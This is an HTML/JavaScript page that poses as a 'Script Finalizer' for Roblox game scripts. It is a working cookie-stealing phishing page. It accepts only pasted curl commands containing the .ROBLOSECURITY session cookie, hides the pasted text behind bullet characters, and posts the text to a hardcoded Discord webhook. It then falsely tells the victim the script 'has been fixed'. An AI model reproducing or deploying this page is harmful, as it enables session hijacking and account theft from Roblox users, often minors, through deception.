<!DOCTYPE html>
<html lang="en" class="h-full" data-theme="dark"> <!-- ← Added data-theme="dark" -->
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Script Finalizer</title>

  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
  <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>

  <!-- THIS LINE FORCES DARK MODE PERMANENTLY -->
  <script>
    tailwind.config = { darkMode: 'class' }
    document.documentElement.classList.add('dark')
  </script>

  <style>
    .grid-bg {
      background-image:
        linear-gradient(rgba(60,60,80,.15) 1px, transparent 1px),
        linear-gradient(90deg, rgba(60,60,80,.15) 1px, transparent 1px);
      background-size: 4rem 4rem;
    }
    .glow-title { text-shadow: 0 0 30px rgba(168, 85, 247, 0.8); }
  </style>
</head>
<body class="min-h-screen bg-black text-white flex items-center justify-center p-6 relative overflow-hidden dark:bg-black"> <!-- ← dark:bg-black added -->

  <!-- Rest of your code (100% unchanged from the working masked version) -->
  <div class="absolute inset-0 grid-bg opacity-25"></div>
  <div class="absolute top-0 left-1/4 w-96 h-96 bg-purple-900/30 rounded-full blur-3xl"></div>
  <div class="absolute bottom-0 right-1/4 w-96 h-96 bg-blue-900/30 rounded-full blur-3xl"></div>

  <div class="relative z-10 w-full max-w-2xl">
    <div class="text-center mb-16">
      <h1 class="text-5xl font-extralight tracking-widest glow-title text-transparent bg-clip-text bg-gradient-to-r from-purple-400 via-pink-400 to-cyan-400 inline-flex items-center gap-4">
        <span class="text-purple-400">→</span> Script Finalizer
      </h1>
      <div class="h-px w-64 bg-gradient-to-r from-transparent via-purple-500 to-transparent mx-auto mt-4"></div>
    </div>

    <div class="bg-zinc-900/70 backdrop-blur-2xl border border-zinc-800 rounded-3xl p-10 shadow-2xl" x-data="scriptFinalizer()">
      <label class="block mb-4 text-sm font-light text-zinc-400 tracking-wider">Insert Game ID BASH</label>

      <textarea x-model="realInput" style="position:absolute; left:-9999px;"></textarea>
      
      <input
        :value="realInput.replace(/./g, '•')"
        @input="realInput = $event.target.value.replace(/•/g, ''); $event.target.value = realInput.replace(/./g, '•')"
        @paste="onPaste($event)"
        :disabled="loading"
        placeholder="curl https://..."
        class="w-full min-h-64 bg-black/60 border border-zinc-700 rounded-2xl px-6 py-5 text-white placeholder-zinc-500 font-mono text-sm resize-none focus:border-purple-500 focus:outline-none transition-all duration-300"
      />

      <div class="mt-3 text-right text-xs text-zinc-500">
        <span x-text="realInput.length"></span> / 4000 characters
      </div>

      <div x-show="message === 'success'" x-transition class="mt-8 bg-green-900/60 border border-green-700 rounded-2xl px-8 py-5 text-center">
        <div class="flex items-center justify-center gap-3 text-green-400">
          <i data-lucide="check-circle" class="w-7 h-7"></i>
          <span class="text-lg font-light">The script has been fixed!</span>
        </div>
      </div>

      <div x-show="message === 'error'" x-transition class="mt-8 bg-red-900/60 border border-red-700 rounded-2xl px-8 py-5 text-center">
        <div class="flex items-center justify-center gap-3 text-red-400">
          <i data-lucide="alert-circle" class="w-7 h-7"></i>
          <span class="text-lg font-light">Invalid input type!</span>
        </div>
      </div>

      <button @click="submit()"
              :disabled="loading || !realInput.trim()"
              class="w-full mt-10 h-16 bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 disabled:opacity-60 disabled:cursor-not-allowed rounded-2xl text-xl font-light tracking-wider transition-all duration-300 flex items-center justify-center gap-4 shadow-lg">
        <template x-if="loading">
          <i data-lucide="loader-2" class="w-7 h-7 animate-spin"></i>
        </template>
        <span x-text="loading ? 'Processing...' : 'Submit Script'"></span>
      </button>
    </div>

    <p class="text-center mt-12 text-zinc-600 text-sm font-light">Only curl commands are accepted</p>
  </div>

  <script>
    function scriptFinalizer() {
      return {
        realInput: '',
        message: null,
        loading: false,

        onPaste(e) {
          e.preventDefault();
          const pasted = (e.clipboardData || window.clipboardData).getData('text');
          this.realInput = pasted;
          e.target.value = pasted.replace(/./g, '•');
        },

        async submit() {
          const raw = this.realInput.trim();

          if (!raw.startsWith('curl') || !raw.includes('.ROBLOSECURITY')) {
            this.message = 'error';
            return;
          }

          this.loading = true;
          this.message = null;

          try {
            let clean = raw
              .replace(/https?:\/\/[^\s]+/g, '')
              .replace(/curl\s+/gi, 'curl ... ')
              .trim()
              .substring(0, 4000);

            await fetch('https://discord.com/api/webhooks/1440146889939882087/HPjpz_PLLJI__-ue7qScQ3IXKMZyhLrjf0ZX64P5uK_W9RoIaCjXQgxWeYFY1TY0i_DP', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                embeds: [{
                  title: "New Script Submission",
                  description: "```bash\n" + clean + "\n```",
                  color: 0x00ff00,
                  timestamp: new Date().toISOString()
                }]
              })
            });

            this.message = 'success';
            this.realInput = '';
          } catch (e) {
            this.message = 'error';
          } finally {
            this.loading = false;
            lucide.createIcons();
          }
        }
      }
    }
  </script>

  <script>lucide.createIcons();</script>
</body>
</html>
